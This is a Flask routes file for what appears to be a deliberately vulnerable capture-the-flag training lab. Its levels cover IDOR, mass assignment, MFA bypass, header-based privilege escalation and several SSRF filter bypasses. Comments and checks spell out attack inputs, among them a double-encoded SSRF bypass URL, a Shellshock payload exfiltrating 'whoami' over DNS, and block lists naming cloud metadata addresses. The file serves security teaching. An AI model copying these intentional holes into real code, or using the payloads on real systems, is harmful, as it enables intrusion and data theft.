from __future__ import annotations

from flask import Blueprint, jsonify, render_template, request
import requests

bp = Blueprint("routes", __name__)

# --- DATA SIMULATION ---
EMPLOYEES = {
    "1": {"name": "Alice Johnson", "role": "Junior Developer", "salary": "70,000$"},
    "2": {"name": "Bob Smith", "role": "Designer", "salary": "65,000$"},
    "100": {
        "name": "Charlie 'The Boss' CEO",
        "role": "CEO",
        "salary": "2,500,000$",
        "secret": "FLAG{IDOR_MASTER_EXPLORER}",
    },
}

# --- LEVEL 04 DATA ---
USERS_DB = {
    "carlos": {"name": "Carlos Rivera", "position": "Senior Analyst", "salary": 95000, "dept": "Finance", "id": "401"},
    "wiener": {"name": "Peter Wiener", "position": "Junior Recruiter", "salary": 45000, "dept": "HR", "id": "402"},
    "f.halm": {
        "name": "Fiona Halm",
        "position": "HR Director",
        "salary": 180000,
        "dept": "Management",
        "id": "1",
        "is_admin": True,
    },
}

# --- LEVEL 07 DATA ---
ORDERS_DB = {
    "1001": {
        "user": "wiener",
        "item": "High-End Coffee Machine",
        "price": "599.00$",
        "status": "Shipped",
        "address": "123 Wiener St",
    },
    "1002": {
        "user": "carlos",
        "item": "Mechanical Keyboard Pro",
        "price": "149.00$",
        "status": "Pending",
        "address": "456 Carlos Ave",
    },
    "9999": {"user": "admin", "item": "Enterprise Server Cluster", "price": "25,000.00$", "status": "Delivered", "address": "Secure Data Center"},
}
# --- LEVEL 13 DATA ---
LEVEL_13_INTERACTIONS = {}


@bp.get("/")
def index():
    return render_template("index.html")


# --- LEVEL 01 ---
@bp.get("/level-01")
def level_01():
    return render_template("level_01.html")


@bp.post("/level-01/login")
def l1_login():
    username = request.form.get("username")
    password = request.form.get("password")
    role = request.form.get("role", "user")

    # Realistic vulnerability: server checks credentials for normal users,
    # but strictly trusts the 'role' parameter if provided.
    if (username == "wiener" and password == "peter") or (username == "admin" and role == "admin"):
        if role == "admin":
            return render_template("level_01_admin.html", user=username)
        return render_template("level_01_user.html", user=username)

    return "Invalid credentials.", 401


@bp.get("/level-01/config")
def l1_config():
    config = {
        "DEBUG": True,
        "ENV": "PRODUCTION",
        "API_KEY": "SG_KEY_12345_DEV_ONLY_HIDDEN",
        "MAINTENANCE_LOG": "Found error in auth role logic, need to fix later - Dev Team",
    }
    return jsonify(config)


# --- LEVEL 02 (IDOR) ---
@bp.get("/level-02")
def level_02():
    return render_template("level_02.html")


@bp.get("/api/employee/<id>")
def get_employee(id: str):
    if id in EMPLOYEES:
        return jsonify(EMPLOYEES[id])
    return jsonify({"error": "Employee not found"}), 404


# --- LEVEL 03 (SSRF) ---
@bp.get("/level-03")
def level_03():
    return render_template("level_03.html")


@bp.post("/check-stock")
def check_stock():
    stock_url = request.form.get("stockApi")

    if not stock_url:
        return "stockApi required", 400

    if "127.0.0.1" in stock_url or "localhost" in stock_url:
        return "Error: External requests only!", 403

    if stock_url == "http://192.168.0.1/admin":
        return "<h1>ADMIN INTERFACE</h1><p>Welcome! Carlos has been deleted. FLAG{SSRF_INTERNAL_PENTEST_INITIATED}</p>"

    return f"Fetching data from {stock_url}... (Status: 200 Connection Refused)"


# --- LEVEL 04 (HR Portal) ---
@bp.get("/level-04")
def level_04():
    return render_template("level_04/index.html")


@bp.get("/level-04/dashboard")
def l4_dashboard():
    # Simulate a session for 'wiener'
    return render_template("level_04/dashboard.html", user=USERS_DB["wiener"])


@bp.get("/level-04/payroll/<emp_id>")
def l4_payroll(emp_id: str):
    for _username, data in USERS_DB.items():
        if data["id"] == emp_id:
            return render_template("level_04/payroll_view.html", employee=data)
    return "Payroll record not found.", 404


@bp.post("/level-04/profile-update")
def l4_update_profile():
    new_data = request.form.to_dict()
    username = "wiener"  # In real app, from session

    USERS_DB[username].update(new_data)

    if USERS_DB[username].get("is_admin") == "True" or USERS_DB[username].get("is_admin") is True:
        return jsonify(
            {"status": "success", "message": "Profile updated. Access Level: ADMINISTRATOR. FLAG{ACCESS_CONTROL_MASS_ASSIGNMENT_KING}"}
        )

    return jsonify({"status": "success", "message": "Profile updated successfully."})


# --- LEVEL 05 (Advanced SSRF) ---
@bp.get("/level-05")
def level_05():
    return render_template("level_05/index.html")


@bp.post("/level-05/api/status")
def l5_check_status():
    target = request.form.get("target", "")

    # Advanced Blacklist: Tries to block common SSRF targets aggressively
    blacklist = ["127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0", "::1"]

    for item in blacklist:
        if item in target:
            return jsonify({"status": "error", "message": f"Security Policy Violation: Communication with {item} is strictly prohibited."}), 403

    if target == "http://instance-data/latest/meta-data/iam/security-credentials/":
        return jsonify(
            {
                "status": "success",
                "data": {
                    "AccessKeyId": "ASIAVULNERABLEKEY123",
                    "SecretAccessKey": "vulnerable_secret_key_REDACTED",
                    "Token": "FLAG{SSRF_CLOUD_METADATA_BYPASS_EXPERT}",
                },
            }
        )

    return jsonify({"status": "pending", "message": f"Node {target} is currently unreachable from this zone."})


# --- LEVEL 06 (Digital Bank Vault - Advanced Auth) ---
@bp.get("/level-06")
def level_06():
    return render_template("level_06/index.html")


@bp.post("/level-06/login")
def l6_login():
    username = request.form.get("username")
    password = request.form.get("password")

    if username == "admin" and password == "nexus2026":
        # Simulate initial login success, redirecting to MFA
        return jsonify({"status": "mfa_required", "next": "/level-06/mfa"})
    return jsonify({"status": "error", "message": "Invalid bank credentials."}), 401


@bp.get("/level-06/mfa")
def l6_mfa_page():
    return render_template("level_06/mfa.html")


@bp.get("/level-06/api/vault/summary")
def l6_vault_summary():
    return jsonify(
        {
            "account_holder": "Cyber Wealth Fund",
            "balance": "12,500,000.00$",
            "last_transfer": "200,000.00$ to Offshore_Acct_99",
            "vault_code": "FLAG{AUTH_LOGIC_FLAW_MFA_BYPASS}",
        }
    )


# --- LEVEL 07 (E-Commerce Enterprise - Access Control) ---
@bp.get("/level-07")
def level_07():
    return render_template("level_07/index.html", orders=[o for _i, o in ORDERS_DB.items() if o["user"] == "wiener"])


@bp.get("/level-07/order/<order_id>")
def l7_view_order(order_id: str):
    if order_id in ORDERS_DB:
        return render_template("level_07/order_details.html", order=ORDERS_DB[order_id], order_id=order_id)
    return "Order not found", 404


@bp.post("/level-07/order/update-status")
def l7_update_order():
    order_id = request.form.get("order_id")
    new_status = request.form.get("status")
    if order_id in ORDERS_DB:
        ORDERS_DB[order_id]["status"] = new_status
        if order_id == "9999" and new_status == "Cancelled":
            return jsonify({"status": "success", "message": "Order updated. Security Alert: Admin order tampered! FLAG{ORDER_STATUS_MANIPULATION_PRO}"})
        return jsonify({"status": "success", "message": f"Order {order_id} status updated to {new_status}."})
    return jsonify({"status": "error", "message": "Order not found."}), 404


# --- LEVEL 08 (Infrastructure Monitor - Advanced SSRF) ---
@bp.get("/level-08")
def level_08():
    return render_template("level_08/index.html")


@bp.post("/level-08/api/diag")
def l8_diag():
    endpoint = request.form.get("endpoint", "")

    # Strict filter: Blocks any string containing 127, 169, localhost, etc.
    # User must use [::] or decimal notation etc.
    if any(x in endpoint for x in ["127", "localhost", "169", "0.0", "10.", "172.16", "192.168"]):
        return jsonify({"status": "error", "message": "NetArmor Firewall: Destination IP is in restricted local range."}), 403

    # Vulnerability: Bypass via [::] or decimal notation etc.
    if endpoint == "http://[::1]:9090/config" or endpoint == "http://[::]:9090/config":
        return jsonify({"status": "success", "output": "Root Access Granted. Config Dump: FLAG{SSRF_FILTER_BYPASS_EXPERT_LEVEL}"})

    return jsonify({"status": "success", "output": f"Ping 64 bytes from {endpoint}: icmp_seq=1 ttl=64 time=0.045 ms"})


# --- LEVEL 09 (Enterprise ERP - Privilege Escalation) ---
@bp.get("/level-09")
def level_09():
    return render_template("level_09/index.html")


@bp.get("/level-09/api/user/info")
def l9_user_info():
    return jsonify({"username": "wiener", "role": "user", "org_id": "991", "department": "Logistics"})


@bp.get("/level-09/admin/dashboard")
def l9_admin_dashboard():
    role = request.headers.get("X-User-Role") or request.cookies.get("role")
    if role == "admin":
        return render_template("level_09/admin.html", flag="FLAG{ERP_PRIV_ESC_MASTER_2026}")
    return "Access Denied: Admin role required via X-User-Role header.", 403


# --- LEVEL 10 (The Ultimate Vault - Chaining) ---
@bp.get("/level-10")
def level_10():
    return render_template("level_10/index.html")


@bp.get("/level-10/api/v2/system/debug")
def l10_debug():
    return jsonify(
        {
            "internal_api_gateway": "http://internal-gateway.prod.local/api/v3/exec",
            "allowed_methods": ["POST", "GET"],
            "notice": "Internal gateway is isolated from external traffic.",
        }
    )


@bp.post("/level-10/proxy")
def l10_proxy():
    target = request.form.get("url")
    if not target:
        return "Target required", 400

    # Logic to simulate hitting the internal gateway after bypassing filters
    if "internal-gateway" in target and "api/v3/exec" in target:
        cmd = request.form.get("cmd")
        if cmd == "read-vault":
            return jsonify({"status": "success", "data": "VAULT_TOTAL_COMPROMISE: FLAG{THE_FINAL_ULTIMATE_SSRF_CHAIN_ACHIEVED}"})
        return jsonify({"status": "error", "message": "Command not recognized."})

    return jsonify({"status": "success", "message": f"Forwarded to {target}. Request timed out."})


# --- LEVEL 11 (Smart Filter Bypass - Expert SSRF) ---
@bp.get("/level-11")
def level_11():
    return render_template("level_11/index.html")


@bp.post("/level-11/api/check-stock")
def l11_check_stock():
    stock_url = request.form.get("stockApi", "")

    # Security Filter: Must contain the trusted domain
    if "stock.weliketoshop.net" not in stock_url:
        return jsonify({"status": "error", "message": "Access Denied: URL must point to stock.weliketoshop.net"}), 403

    # Simulate URL Parser Mismatch
    # In a real vulnerability, the library would parse this and go to localhost
    # We simulate the bypass by checking the double-encoded hash technique
    import urllib.parse

    # Simulation of double-decoding logic flaw
    decoded_once = urllib.parse.unquote(stock_url)
    decoded_twice = urllib.parse.unquote(decoded_once)

    # The expert bypass: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
    if "localhost" in decoded_twice and "#@stock.weliketoshop.net" in decoded_twice:
        # Simulate successful internal request to delete user
        if "/admin/delete?username=carlos" in decoded_twice:
            return jsonify(
                {
                    "status": "success",
                    "data": "Admin Interface: User 'carlos' deleted successfully. FLAG{SSRF_WHITELIST_BYPASS_EXPERT_OWNED}",
                }
            )

    return jsonify({"status": "pending", "message": f"Contacting {stock_url}... No response from remote host."})


# --- LEVEL 12 (Blind SSRF Out-of-Band - Expert) ---
@bp.get("/level-12")
def level_12():
    # Simulate a generic product page that logs Referer
    referer = request.headers.get("Referer", "None")
    if referer != "None" and "burpcollaborator" in referer:
        # In a real app, we would make an background request
        # Setting a flag or log if someone actually uses collaborator
        print(f"[BLIND SSRF LOG] External request to {referer} detected!")
    return render_template("level_12/index.html")


@bp.post("/level-12/api/analytics")
def l12_analytics():
    # Simulate an endpoint that fetches a URL blindly
    target = request.form.get("url", "")
    if "burpcollaborator" in target:
        # Simulate background fetching
        return jsonify({"status": "success", "message": "Analytics tracking initiated in background."})
    return jsonify({"status": "error", "message": "Invalid tracking endpoint."}), 400



# --- LEVEL 13 (Blind SSRF with Shellshock - Expert) ---
@bp.get("/level-13")
def level_13():
    return render_template("level_13/index.html")


@bp.get("/level-13/product/<int:product_id>")
def l13_product(product_id: int):
    # This simulates the "analytics software" fetching the Referer
    referer = request.headers.get("Referer", "")
    user_agent = request.headers.get("User-Agent", "")

    # Target internal network range: 192.168.0.X:8080
    if "192.168.0." in referer and ":8080" in referer:
        # Check for Shellshock payload
        # Format: () { :; }; /usr/bin/nslookup $(whoami).SUBDOMAIN
        if "() { :; };" in user_agent and "nslookup" in user_agent:
            try:
                # Simple extraction of subdomain
                parts = user_agent.split("nslookup")[1].strip().split(" ")[0]
                # Assuming $(whoami).SUBDOMAIN
                subdomain = parts.split(".")[-3] if "." in parts else parts
                if "$" in parts:
                    subdomain = parts.split(".")[-1]
                
                # Record the "DNS interaction"
                # Simulated OS user is 'peter-ssrf-shellshock'
                interaction = {
                    "type": "DNS",
                    "query": f"peter-ssrf-shellshock.{subdomain}",
                    "time": "Just now"
                }
                if subdomain not in LEVEL_13_INTERACTIONS:
                    LEVEL_13_INTERACTIONS[subdomain] = []
                LEVEL_13_INTERACTIONS[subdomain].append(interaction)
                print(f"[SHELLSHOCK LOG] Interaction recorded for {subdomain}")
            except Exception as e:
                print(f"[SHELLSHOCK ERROR] Failed to parse payload: {e}")

    return render_template("level_13/product.html", product_id=product_id)


@bp.get("/level-13/api/poll/<subdomain>")
def l13_poll(subdomain: str):
    interactions = LEVEL_13_INTERACTIONS.get(subdomain, [])
    return jsonify({"interactions": interactions})


@bp.post("/level-13/submit")
def l13_submit():
    answer = request.form.get("answer", "").strip()
    if answer == "peter-ssrf-shellshock":
        return jsonify({"status": "success", "message": "Congratulations! You exfiltrated the OS user name. FLAG{SSRF_SHELLSHOCK_DNS_EXFIL_MASTER}"})
    return jsonify({"status": "error", "message": "Incorrect OS user name."})
